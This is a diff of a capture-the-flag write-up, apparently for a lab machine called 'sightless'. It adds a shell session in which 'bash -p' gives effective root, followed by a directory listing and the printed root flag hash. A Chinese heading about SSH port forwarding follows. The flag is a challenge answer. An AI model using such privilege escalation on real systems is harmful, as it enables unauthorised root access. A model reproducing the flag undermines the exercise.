@@ -254,8 +254,27 @@ michael@sightless:~$ bash -p
 bash-5.1# id
 uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael)
 
+bash-5.1# ls -al
+total 28
+drwxr-x--- 3 michael michael 4096 Jul 31  2024 .
+drwxr-xr-x 4 root    root    4096 May 15  2024 ..
+lrwxrwxrwx 1 root    root       9 May 21  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 michael michael 3771 Jan  6  2022 .bashrc
+-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
+drwx------ 2 michael michael 4096 May 15  2024 .ssh
+-rw-r----- 1 root    michael   33 Sep  4 15:50 user.txt
 
+bash-5.1# cd /dev/shm
+bash-5.1# ls -la
+total 0
+drwxrwxrwt  2 root root   40 Sep  4 15:50 .
+drwxr-xr-x 20 root root 4020 Sep  4 15:48 ..
 
+bash-5.1# cat /root/root.txt
+4af9c062be0b320a316c87fe16c0f7f6
+
+```
 
 #### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
 ```
